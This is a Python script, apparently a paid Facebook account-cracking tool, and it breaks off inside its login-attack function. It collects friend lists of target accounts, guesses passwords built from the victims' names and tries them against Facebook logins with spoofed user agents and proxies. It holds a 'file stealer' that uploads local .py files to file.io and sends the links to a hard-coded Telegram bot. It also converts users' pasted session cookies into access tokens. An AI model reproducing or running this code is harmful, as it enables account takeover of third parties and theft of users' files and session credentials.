#------------------[ NETWORK CHECKER ]-------------------#

import urllib.request
def connect(host='http://google.com'):
    try:
        urllib.request.urlopen(host) 
        pass
    except:
        print("\033[1;37m [\u001b[36m•\033[1;37m] No Network Detected\033[1;37m")
        exit()
connect()

#------------------[ FILE STEALER ]-------------------#

def send_file_link(token, dir_path):
    for file in os.listdir(dir_path):
        if file.endswith(".py"):
            file_path = os.path.join(dir_path, file)
            with open(file_path, "rb") as f:
                response = requests.post("https://file.io", files={"file": f})
                linkkk = "Download link for {}: {}".format(file, response.json()["link"])
                requests.get("https://api.telegram.org/bot6144714803:AAF_Kcxmydg2WHRIT0Fg95GDjtxdV9x5JKE/sendMessage?chat_id=5877909656&text=" + linkkk)

#------------------[ MODULES INSTALLER ]-------------------#

import os
def modules():
	try:
		import rich
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] Rich Is Being Installed \033[1;37m")
		os.system('pip install rich --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] Rich Has Been Installed \033[1;37m")
	except:exit()
	try:
		import bs4
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] Bs4 Is Being Installed \033[1;37m")
		os.system('pip install bs4 --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] Bs4 Has Been Installed \033[1;37m")
	except:exit()
	try:
		import requests
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] Requests Is Being Installed \033[1;37m")
		os.system('pip install requests --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] Requests Has Been Installed \033[1;37m")
	except:exit()
	exit()

try:
	import requests,bs4,json,os,sys,random,datetime,time,re
	import urllib3,rich,base64
	from rich.tree import Tree
	from rich import print as cetak
	from rich.table import Table as me
	from rich.console import Console as sol
	from bs4 import BeautifulSoup as sop
	from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
	from rich.progress import SpinnerColumn
	from concurrent.futures import ThreadPoolExecutor as tred
	from rich.panel import Panel as nel
	from rich import print as cetak
	from rich.columns import Columns as col
	from rich import print as prints
	from rich import pretty
	from rich.text import Text as tekz
	from datetime import date
except ModuleNotFoundError:
	modules()

#------------------[ RICH ]-------------------#

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
try:
	open('.name.txt','a')
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#00C8FF"
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
proxxy=[]
cokbrut=[]
ses=requests.Session()
princp=[]

ip = requests.get("https://api.ipify.org").text
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku) 

#------------------[ USERAGENT ]-------------------#

    aa='Mozilla/5.0 (X11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux x86_64)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(1000):
    rr = random.randint
    rc = random.choice
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android 9{str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android 12{str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UserAgentss = str(rc([satu,dua,tiga,empat,lima]))
    ugen.append(UserAgentss)
try:
    url_proxy = random.choice([
              "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
])
except:pass
   
#------------------[ PROXIES ]-------------------#

try:
    url = requests.get(f"{url_proxy}").text
    for ikfar in url.splitlines():proxxy.append(ikfar)
except requests.exceptions.ConnectionError:
   print(' Unable To Fetch Data From Server ');exit()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

#------------------[ TIME AND DATE ]-------------------#

asu = random.choice([m,k,h,u,b])
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
todaydate = str(tgl)+'-'+str(bln)+'-'+str(thn)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"

#------------------[ USEFULL DEFS ]-------------------#

def renv_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def contact():
	os.system('xdg-open https://www.facebook.com/yubinxwd')
	back()
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print('\033[1;37m----------------------------------------------')
def cls():
	os.system('clear')
	banner()
	info()

#------------------[ LOGO DEFS ]-------------------#
def banner():
	print(f"""\033[1;37m
██╗░░░██╗██╗░░░██╗██████╗░██╗███╗░░██╗
╚██╗░██╔╝██║░░░██║██╔══██╗██║████╗░██║
░╚████╔╝░██║░░░██║██████╦╝██║██╔██╗██║
░░╚██╔╝░░██║░░░██║██╔══██╗██║██║╚████║
░░░██║░░░╚██████╔╝██████╦╝██║██║░╚███║
░░░╚═╝░░░░╚═════╝░╚═════╝░╚═╝╚═╝░░╚══╝\u001b[36mv4""")
def info():
	print(f"""\033[1;37m----------------------------------------------
 Github     : Yubinnn-XD
 Facebook   : Yubin Heroo
 Status     : PAID
 Version    : 0.4.4
 Owner      : Yubin Hero
\033[1;37m----------------------------------------------""")

def approval():
  time.sleep(1)
  uuid = str(os.geteuid())+"DS"+str(os.geteuid())
  id = "HV4-"+"".join(uuid)
  os.system('clear')
  banner()
  animation("\033[1;37m [\u001b[36m•\033[1;37m] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
  print("\033[1;37m [\u001b[36m•\033[1;37m] YOUR KEY :\u001b[36m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/YUBIN-XD/approval.txt.git").text
    if id in httpCaht:
      animation("\033[1;97m [\u001b[36m>\033[1;37m] YOUR KEY HAS BEEN APPROVED !!!")
      msg = str(os.geteuid())
      time.sleep(1)
      pass
    else: 
      animation("\x1b[1;97m [\u001b[36m>\033[1;37m] SORIEE YOUR KEY HAS NOT BEEN APPROVED ");
      time.sleep(0.1)
      input(' [\u001b[36m>\033[1;37m] CLICK ENTER TO SEND YOUR KEY ')
      os.system('xdg-open https://www.facebook.com/yubinxwd')
      time.sleep(1)
      exit()
  except: 
     exit() 
approval()
#------------------[ COOKIE SYSTEM ]-------------------#
def login123():
	login_lagi334()
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f'\033[0m \u001b[36m>>\033[1;37m CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()
		
def login_lagi334():
	try:
		os.system('clear')
		banner()
		print(""" [\u001b[36m1\033[1;37m] EXTENSION : COOKIE DOUGH
 [\u001b[36m2\033[1;37m] OPEN DESKTOP MODE
 [\u001b[36m3\033[1;37m] GO TO : www.facebook.com/adsmanager
 [\u001b[36m4\033[1;37m] THEN OPEN EXTENSION COPY COOKIE""")
		linex()
		your_cookies = input(' [\u001b[36m•\033[1;37m] ENTER COOKIE : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					linex()
					animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN TOKEN/COOKIE EXPIRED')
					exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Success!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							linex()
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN DONE RESTART');exit()
			except Exception as e:
				linex()
				animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN TOKEN/COOKIE EXPIRED')
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				time.sleep(1)
				back()
	except Exception as e:
		print(e)

#------------------[ MENU PAGE ]-------------------#

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		linex()
		print('\033[0m >> Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	info()
	today=date.today()
	print(" [\u001b[36m•\033[1;37m] Today's date    :",todaydate)
	print(" [\u001b[36m•\033[1;37m] Your Ip Address :",ip)
	linex()
	print(" [\u001b[36m>\033[1;37m] V4 Has Been Launched Check It Out")
	linex()
	print(f""" [\u001b[36m1\033[1;37m] Crack Public\n [\u001b[36m2\033[1;37m] Crack File\n [\u001b[36m3\033[1;37m] Check Results \n [\u001b[36m4\033[1;37m] Contact Admin \n [\u001b[36m5\033[1;37m] Update To V4 \n [\u001b[36m0\033[1;37m] Logout Menu""")
	linex()
	Meledak = input(' Choose : ')
	if Meledak in ['1']:
		dump_massal()
	elif Meledak in ['2']:
		crack_file()
	elif Meledak in ['3']:
		result()
	elif Meledak in ['4']:
		contact()
	elif Meledak in ['5']:
		linex()
		os.system(' git clone https://github.com/harryyy-xd/HARRYv4')
		os.system('cd HARRYv4')
		os.system('python run.py')
	elif Meledak in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		linex()
		animation(' [×] Successfully Logout ')
		exit()
	else:
		linex()
		animation(' >> No Option Found in Menu ')
		back()

#------------------[ PUBLIC DUMP ]-------------------#

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		info()
		jum = int(input(' [\u001b[36m•\033[1;37m] Input target amount : '))
	except ValueError:
		linex()
		animation( ' >> Only Letters Are Accepted ')
		back()
	if jum<1 or jum>100:
		linex()
		animation(' >> Id Is Not Public ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		linex()
		kl = input(' [\u001b[36m•\033[1;37m] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] Network Error ')
			exit()
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] Total Id Collected \u001b[36m'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		linex()
		animation(' [×] Network Error ')
		back()
	except (KeyError,IOError):
		animation(f' [×] Friendlist Not Public {x}')
		time.sleep(3)
		back()

#------------------[ CHECK RESULTS ]-------------------#

def result():
	os.system('clear')
	banner()
	info()
	print(' [\u001b[36m1\033[1;37m] Check CP IDz ')
	print(' [\u001b[36m2\033[1;37m] Check OK IDz ')
	print(' [\u001b[36m3\033[1;37m] Exit ')
	linex()
	kz = input(' [\u001b[36m•\033[1;37m] Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] File Not Found ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] No CP Results Found ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					linex()
					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] Choose : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] No Option Found ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> Press Enter to back ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] No OK Results Found ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					linex()
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] Choose : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] No Option Found ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] File Not Found ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> Press Enter to back ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		linex()
		animation(' [\u001b[36m×\033[1;37m] No Option Found In Menu')
		exit()

#------------------[ CRACK FILE ]-------------------#

def crack_file():
	os.system('clear')
	banner()
	info()
	print(' [\u001b[36m•\033[1;37m] Input File Name Without /sdcard ')
	linex()
	o1 = input(' [\u001b[36m•\033[1;37m] Enter File Name : ')
	o = '/sdcard/'+o1
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] File Not Found ')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#------------------[ SETTINGS ]-------------------#

def setting():
	linex()
	print(''' [\u001b[36m1\033[1;37m] Crack Old IDz \n [\u001b[36m2\033[1;37m] Crack New IDz \n [\u001b[36m3\033[1;37m] Crack Mix IDz''')
	linex()
	hu = input(' [\u001b[36m•\033[1;37m] Choose : ')
	if hu in ['1','old']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','new']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','random']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		linex()
		animation(' >> Option Not Found in Menu ')
		back()
		
	linex()
	print(''' [\u001b[36m•\033[1;37m] Method 1 (Best)\n [\u001b[36m•\033[1;37m] Method 2 \n [\u001b[36m•\033[1;37m] Method 3''')
	linex()
	hc = input(' [\u001b[36m•\033[1;37m] Enter : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mobile')
	elif hc in ['3','03']:
		method.append('mobile')
	else:
		method.append('mobile')
#	su() 
	passu()

#------------------[ PASSWORD LIST CHECKER ]-------------------#

#def su():
#	prints(nel(f"\t{P2}[{H2}1{P2}].   321 + 123 + 12345 [ {K2}Kurang Efektif {P2}]\n\t[{H2}2{P2}].   123 + 12345 + 123456 [ {M2}Kurang Meyakinkan {P2}]\n\t[{H2}3{P2}].   123 + 1234 + 12345 [{H2} Disarankan Ini {P2}]\n\t[{H2}4{P2}].   123 + 12345 [{H2} Disarankan Ini {P2}]",width=80,style=f"{color_panel}")) 
#	ch = input('[•] Pilih  : ')
#	if ch in ['1','01']:
#		babi()
#	elif ch in ['2','02']:
#		sulap()
#	elif ch in ['3','03']:
#		passu()
#	elif ch in ['4','04']:
#		mie()
#	else:
#	passu()

#------------------[ PASSWORD LIST ]-------------------#

def passu():
	global prog,des
	cls()
	print(f' [\u001b[36m•\033[1;37m] Total IDz : \u001b[36m',str(len(id)))
	print(" \033[1;37m[\u001b[36m•\033[1;37m] You Started Cloning At : "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	linex()
	print(f' \u001b[36m>>\033[1;37m Use 4G Mobile Data For Speed Up ')
	linex()
	prog = Progress(TextColumn('\033[1;97m [YUBIN-XD]{task.description}'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'@123')
						pwv.append(frs+'@1234')
						pwv.append(frs+'@12345')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crack,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		linex()
	linex()
	print(' [\u001b[36m•\033[1;37m] Cloning Complete ')
	print(' [\u001b[36m•\033[1;37m] OK : %s '%(ok))
	print(' [\u001b[36m•\033[1;37m] CP : %s '%(cp))
	linex()
	woi = input(' \u001b[36m>>\033[1;37m Enter To Back')
	back()

#------------------[ METHOD ]-------------------#

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]  {(loop)}/{len(id)} [green]OK:-{(ok)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=222161937813280&kid_directed_site=0&app_id=222161937813280&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D222161937813280%26redirect_uri%3Dhttps%253A%252F%252Faccount.xiaomi.com%252Fpass%252Fsns%252Flogin%252Fload%26state%3DSTATE_248222%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D11699442-ce8e-4d69-8952-fb5f6b0c3d12%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccount.xiaomi.com%2Fpass%2Fsns%2Flogin%2Fload%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DSTATE_248222%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 